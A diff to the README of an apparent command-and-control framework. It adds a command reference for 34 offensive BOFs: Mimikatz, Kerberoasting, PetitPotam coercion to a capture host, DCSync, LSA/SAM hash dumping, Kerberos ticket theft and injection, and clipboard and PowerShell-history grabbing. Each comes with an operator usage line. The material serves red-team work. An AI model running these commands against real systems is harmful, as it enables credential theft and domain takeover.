@@ -12,7 +12,7 @@ The repository ships runnable files in `modules/bof/`, `modules/native/`, and `m
 
 ```text
 undertow> modules
-undertow> help bof-hello
+undertow> help bof-winver
 undertow> help module-wininfo
 undertow> help wasm-triage
 undertow> use 1
@@ -23,7 +23,7 @@ undertow[TALON]> job output 1
 
 ## Shipped modules
 
-The repository includes **16 compiled modules** with help sidecars. Start or reattach a console from this checkout so it scans `modules/`, type `modules` to confirm what loaded, then `agents` and `use NUMBER` to select the target. The examples below are commands to type **inside the selected-agent console**. Run `help COMMAND` before a command to see its local help; the module file is sent to the agent when you invoke it.
+The repository includes **45 compiled modules** with help sidecars. Start or reattach a console from this checkout so it scans `modules/`, type `modules` to confirm what loaded, then `agents` and `use NUMBER` to select the target. The examples below are commands to type **inside the selected-agent console**. Run `help COMMAND` before a command to see its local help; the module file is sent to the agent when you invoke it.
 
 ### WASM host assessment (Windows or Linux agents)
 
@@ -52,17 +52,90 @@ For `wasm-artifact-discovery`, add an **agent-side** root such as `wasm-artifact
 
 **Long-running Sift scans:** Sift can run for an extended time across large directories, shares, or a domain; its file and host limits are unset by default. Run `module-sift --background local C:\Audit --json` to keep the console available, then use `jobs`, `job output JOB_ID`, and `job stop JOB_ID` to inspect or stop it. Use `help module-sift` or `module-sift --help` for its local, network, and domain scan modes and optional limits. See the [native examples](../modules/native/README.md), [Sift guide](../modules/native/sift/README.md), and [askpass guide](../modules/native/askpass/README.md).
 
-### BOF compatibility examples (Windows AMD64 agents)
+### BOFs (Windows AMD64 agents)
 
-| Console command | What it does | Basic use |
+The 34 packaged BOFs come from the linked open source projects. The console loads each `.x64.o` with a typed argument sidecar. Run `help bof-NAME` for the exact argument types. Commands below run **inside a selected-agent console**; uppercase values are placeholders. Several return credentials or change Kerberos ticket state. The [BOF compatibility guide](bof-compatibility.md) explains inspection and adding your own objects.
+
+**[Adrenaline](https://github.com/atomiczsec/Adrenaline)**
+
+| Command | Purpose | Basic use |
 | --- | --- | --- |
-| [bof-hello](../modules/bof/README.md) | Demonstrates Beacon output and a Windows import. | `bof-hello` |
-| [bof-arguments](../modules/bof/README.md) | Demonstrates typed integer, short, text, wide-text, and binary arguments. | `bof-arguments 123 7 hello world base64:AAEC` |
-| [bof-imports](../modules/bof/README.md) | Exercises Windows imports from several DLLs. | `bof-imports` |
-| [bof-loaderimports](../modules/bof/README.md) | Exercises runtime loader imports and typed integer parsing. | `bof-loaderimports 0x01020304` |
-| [bof-loop](../modules/bof/README.md) | Runs until cancelled; useful for testing background jobs. | `bof-loop --background` |
+| `bof-ai-surface` | Locate AI tools, agent profiles, and MCP configuration artifacts. | `bof-ai-surface` |
+| `bof-clipboard` | Read the current text clipboard. | `bof-clipboard` |
+| `bof-notepad-grab` | Read text from open Notepad windows. | `bof-notepad-grab` |
+| `bof-powershell-history` | Find PSReadLine history and PowerShell transcript excerpts. | `bof-powershell-history` |
+| `bof-window-list` | List visible windows; `/pid` adds process information. | `bof-window-list /pid` |
 
-After starting `bof-loop --background`, run `jobs` to find its job ID and `job stop JOB_ID` to end it. The BOFs are loader and API examples; see the [BOF examples](../modules/bof/README.md) and [compatibility guide](bof-compatibility.md) for inspection, supported imports, and argument formats.
+Adrenaline credits [NoteThief](https://github.com/trainr3kt/NoteThief) as the basis for `notepad-grab`.
+
+**[BOFKatz](https://github.com/KrakenEU/BOFKatz)**
+
+| Command | Purpose | Basic use |
+| --- | --- | --- |
+| `bof-kiwi` | Run the in-memory Mimikatz wrapper; its default command is `coffee`. | `bof-kiwi` |
+
+**[C2-Tool-Collection](https://github.com/outflanknl/C2-Tool-Collection)** (Outflank)
+
+| Command | Purpose | Basic use |
+| --- | --- | --- |
+| `bof-kerberoast` | List SPN-enabled accounts or request service tickets. | `bof-kerberoast list` |
+| `bof-petitpotam` | Ask a target to authenticate to a capture host via EFSRPC. | `bof-petitpotam CAPTURE_HOST TARGET_HOST` |
+| `bof-reconad` | Query AD objects and attributes with a custom LDAP filter. | `bof-reconad custom "(objectClass=computer)" name 10 0 ""` |
+| `bof-winver` | Show Windows version, build, and patch release. | `bof-winver` |
+
+For `bof-kerberoast`, `roast` requests tickets and accepts an optional account filter. For `bof-reconad`, the final three fields are maximum results, Global Catalog switch (`0` or `1`), and optional `server:port`; empty uses the default. The [Outflank source](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF) has further modes and original credits.
+
+**[CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)** (TrustedSec)
+
+| Command | Purpose | Basic use |
+| --- | --- | --- |
+| `bof-adcs-enum` | Enumerate AD Certificate Services authorities and templates. | `bof-adcs-enum ""` |
+| `bof-enumlocalsessions` | List local and RDP user sessions. | `bof-enumlocalsessions` |
+| `bof-ldapsearch` | Search LDAP, selecting attributes, count, scope, host, DN, and LDAPS. | `bof-ldapsearch "(objectClass=computer)" "name,dNSHostName" 10 3 "" "" 0` |
+| `bof-listdns` | List DNS cache entries and resolve each name. | `bof-listdns` |
+
+For `bof-adcs-enum`, `""` means the current domain. For `bof-ldapsearch`, `3` is the upstream default scope, the empty host and DN use discovered defaults, and final `0` disables LDAPS. See the [upstream command reference](https://github.com/trustedsec/CS-Situational-Awareness-BOF#readme) for more search options.
+
+**[Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF)**
+
+Kerbeus takes its `/option:value` switches as **one quoted argument** in Undertow. Keep the quotes when supplying more than one switch. The [upstream reference](https://github.com/RalfHacker/Kerbeus-BOF#readme) documents further flags and ticket formats.
+
+| Command | Purpose | Basic use |
+| --- | --- | --- |
+| `bof-asktgt` | Request a ticket-granting ticket using an account key. | `bof-asktgt "/user:USER /rc4:HASH"` |
+| `bof-asktgs` | Request a service ticket using a base64 TGT. | `bof-asktgs "/ticket:BASE64 /service:SPN"` |
+| `bof-asreproasting` | Request an AS-REP for an account without preauthentication. | `bof-asreproasting "/user:USER"` |
+| `bof-changepw` | Change an account password using a ticket. | `bof-changepw "/ticket:BASE64 /new:PASSWORD"` |
+| `bof-cross-s4u` | Request a cross-domain S4U service ticket. | `bof-cross-s4u "/ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC /impersonateuser:USER"` |
+| `bof-describe` | Decode and describe a base64 Kerberos ticket. | `bof-describe "/ticket:BASE64"` |
+| `bof-dump` | Export tickets from accessible logon sessions. | `bof-dump` |
+| `bof-hash` | Calculate Kerberos key hashes from a password. | `bof-hash "/password:PASSWORD"` |
+| `bof-klist` | List tickets in accessible logon sessions. | `bof-klist` |
+| `bof-ptt` | Import a base64 ticket into a logon session. | `bof-ptt "/ticket:BASE64"` |
+| `bof-purge` | Purge tickets from a logon session. | `bof-purge` |
+| `bof-renew` | Renew a base64 ticket-granting ticket. | `bof-renew "/ticket:BASE64"` |
+| `bof-s4u` | Request a constrained delegation S4U service ticket. | `bof-s4u "/ticket:BASE64 /service:SPN /impersonateuser:USER"` |
+| `bof-tgtdeleg` | Request a delegated TGT for the current user. | `bof-tgtdeleg` |
+| `bof-triage` | Summarize tickets in accessible logon sessions. | `bof-triage` |
+
+**[DCSync-Bof](https://github.com/P0142/DCSync-Bof)**
+
+| Command | Purpose | Basic use |
+| --- | --- | --- |
+| `bof-dcsync-single` | Request replication data for one domain account. | `bof-dcsync-single USER 0 "" "" 0` |
+| `bof-dcsync-all` | Request replication data for accounts in a domain or OU. | `bof-dcsync-all "" "" 0` |
+
+These need an authenticated domain context with directory replication rights. Their fields mirror the [upstream commands](https://github.com/P0142/DCSync-Bof#usage): `0` means the account is a name rather than a DN, empty strings use the default OU/DC, and final `0` disables LDAPS.
+
+**[LSAdump-BOF](https://github.com/shashinma/LSAdump-BOF)**
+
+| Command | Purpose | Basic use |
+| --- | --- | --- |
+| `bof-lsadump-cache` | Extract cached domain credential hashes; requires SYSTEM. | `bof-lsadump-cache` |
+| `bof-lsadump-sam` | Extract local account NTLM hashes; requires administrator rights. | `bof-lsadump-sam` |
+| `bof-lsadump-secrets` | Extract LSA secrets; requires SYSTEM. | `bof-lsadump-secrets` |
+
+The old loader demonstration BOFs are kept under `internal/bof/testdata/examples/` for development tests. They no longer appear as operator commands.
 
 Startup names are `bof-`, `module-`, or `wasm-` followed by the filename stem, lowercased. A final `.x64`, `.amd64`, `.win64`, or `.windows-amd64` before the extension is removed. Thus `network.x64.o` becomes `bof-network` and `wininfo.module` becomes `module-wininfo`. Names must begin with a lowercase ASCII letter, contain only lowercase ASCII letters, digits, and hyphens, and be at most 64 characters. A duplicate name or invalid artifact is reported as a preload warning and skipped. Built-in console commands cannot be replaced.
 
